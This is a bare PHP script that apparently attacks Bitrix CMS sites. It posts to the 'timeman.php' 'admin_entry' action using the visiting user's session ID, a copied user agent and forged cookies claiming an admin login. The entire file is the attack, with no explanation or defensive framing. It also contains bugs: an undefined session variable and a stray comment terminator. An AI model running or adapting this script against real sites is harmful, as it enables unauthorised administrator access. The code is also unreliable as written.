<? $ch = curl_init();
$csx = session_id();
$csa = $_SERVER["HTTP_USER_AGENT"];
$cax = $_SERVER["HTTP_HOST"];
$wx = '/bitrix/tools/timeman.php?action=admin_entry&site_id=s1&sessid=';
$request_url = $cax.$wx.$ssid;
echo $request_url;
echo '<br>';
curl_setopt($ch, CURLOPT_URL, "$request_url");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "ID=1&slider_type=0");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');*/
$headers = array();
$headers[] = "Host: $cax";
$headers[] = "User-Agent:$csa";
$headers[] = "Accept: */*";
$headers[] = "Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3";
$headers[] = "Referer: $cax/company/mod.php";
$headers[] = "Bx-Ajax: true";
$headers[] = "Content-Type: application/x-www-form-urlencoded";
$headers[] = "Cookie: PHPSESSID=$csx; BITRIX_SM_TIME_ZONE=-180; BITRIX_SM_SALE_UID=1; BITRIX_SM_LOGIN=admin; BITRIX_SM_SOUND_LOGIN_PLAYED=Y";
$headers[] = "Connection: keep-alive";
$headers[] = "Pragma: no-cache";
$headers[] = "Cache-Control: no-cache";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close ($ch);
//print_r ($cax);
?>
